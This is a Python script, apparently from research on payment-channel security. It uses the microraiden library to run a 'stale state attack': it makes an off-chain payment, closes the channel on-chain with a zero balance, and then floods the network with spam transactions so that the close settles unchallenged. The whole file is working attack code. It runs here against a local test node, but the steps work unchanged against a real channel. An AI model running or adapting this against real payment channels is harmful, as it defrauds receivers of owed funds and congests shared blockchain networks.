import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '../..'))

from microraiden import Client
from microraiden.utils import privkey_to_addr
from utils import (
    send_payment,
    create_close_channel_transaction,
    create_spam_transactions,
    wait_for_blocks,
    wait_for_open,
    wait_for_close,
    wait_for_settle,
)
import config as config
from web3 import Web3, HTTPProvider
import logging, click, json

def cheat_and_spam(channel, private_key, number_txs: int = 100):
    '''
    Performs a stale state attack on the given channel. 
    Assumes that the given channel's balance is > 0. Closes the channel with balance 0 
    and spams the network with the given number {number_txs} of transactions from 
    the account with the given {private_key}.
    '''
    # Create close channel transaction
    close_tx = create_close_channel_transaction(channel, 0)

    # Create given number of signed spam transactions
    spam_txs = create_spam_transactions(private_key=private_key, web3=channel.core.web3, account_address=privkey_to_addr(private_key), nonce_offset=1, number=number_txs)

    # Send close channel transaction    
    logging.info('Sending close transaction...')
    channel.core.web3.eth.sendRawTransaction(close_tx)

    # Wait for channel to be closed
    closed_event = wait_for_close(channel)
    logging.info('Channel closed at block #{}'.format(closed_event['blockNumber']))

    # Send spam transactions
    logging.info('Sending {} spam transactions...'.format(len(spam_txs)))
    for tx in spam_txs:
        channel.core.web3.eth.sendRawTransaction(tx)
    
    # Wait for channel to be settled
    settled_event = wait_for_settle(channel)
    logging.info('Channel settled at block #{}'.format(settled_event['blockNumber']))

    # Print result
    print()
    print('-----------------------------------------------------------')
    print('Sender \t\t {}'.format(channel.core.address))
    print('Receiver \t {}'.format(channel.receiver))
    print()
    print('OPENED \t\t #{}'.format(channel.block))
    print('CLOSED \t\t #{}'.format(closed_event['blockNumber']))
    print('SETTLED \t #{}'.format(settled_event['blockNumber']))
    print()
    print('# Spam transactions = {}'.format(len(spam_txs)))
    print('# Blocks(CLOSE -> SETTLE) = {}'.format(settled_event['blockNumber']-closed_event['blockNumber']))
    print('-----------------------------------------------------------')
    print()

@click.command()
@click.option(
    '--rpcport',
    default=8545,
    help='Port of the RPC server',
    type=int
)
def main(rpcport: int):
    # Initialize web3
    web3 = Web3(HTTPProvider('http://127.0.0.1:' + str(rpcport)))

    # Initialize client
    client = Client(private_key=config.PRIVATE_KEY, key_password_path=None, channel_manager_address=config.CHANNEL_MANAGER_ADDRESS)

    # Get an open channel
    channel = client.get_suitable_channel(receiver=web3.toChecksumAddress(config.RECEIVER_ADDRESS), value=1)

    # Wait for channel to be open
    opened_event = wait_for_open(channel=channel, confirmations=2)
    logging.info('Active channel: (sender={}, block={})'.format(channel.sender, channel.block))

    # Send an off-chain payment
    amount = 1
    channel.create_transfer(amount)
    send_payment(channel=channel, amount=amount)

    # Start stale state attack
    cheat_and_spam(channel=channel, private_key=config.PRIVATE_KEY, number_txs=config.NUMBER_SPAM_TX)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    main()
